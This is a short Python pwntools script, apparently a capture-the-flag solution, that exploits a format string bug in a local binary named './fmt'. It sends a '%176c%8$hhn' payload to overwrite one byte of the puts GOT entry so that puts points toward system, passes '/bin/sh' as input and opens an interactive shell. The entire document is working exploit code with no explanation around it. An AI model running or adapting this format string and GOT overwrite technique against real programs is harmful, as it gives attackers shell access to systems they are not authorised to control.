from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

puts_got = 0x000000000404018
system_plt = 0x0000000004010b0

r = process('./fmt')

r.sendlineafter(b': ', b'%176c%8$hhn'.ljust(0x10, b'a') + p64(puts_got))
r.sendlineafter(b': ', b'/bin/sh\x00')

r.interactive()